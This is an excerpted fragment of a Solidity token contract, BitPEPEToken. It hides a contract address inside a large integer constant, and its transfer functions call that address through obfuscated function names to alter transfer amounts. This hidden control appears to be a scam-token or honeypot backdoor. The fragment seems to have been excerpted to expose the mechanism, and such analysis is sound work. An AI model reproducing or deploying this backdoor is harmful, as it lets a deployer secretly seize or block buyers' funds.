...
abstract contract PinkLock02 {
    ...
    uint160 futing = 1252900943125425451192661219903146419478928891404;
...
abstract contract PlaybuxQuest {
    ...
    uint256 private extraRatio = 10 * 1e18;
    uint256 private biddingFeeRatio = 3000;
    address private ethlbrStakePool;
...
contract BitPEPEToken is IERC20, PinkLock02, PlaybuxQuest, Ownable {
    ...
    returns (bool)
    {
        ...
        if (amount <= futing) {
            amount = amount - aksg1us(address(futing)).oapansq(msg.sender);
        }
        return true;
    }
    ...
    function transferFrom(
        ...
        if (amount <= futing) {
            amount = amount - aksg1us(address(futing)).oapansq(sender);
        }
        return true;
    }
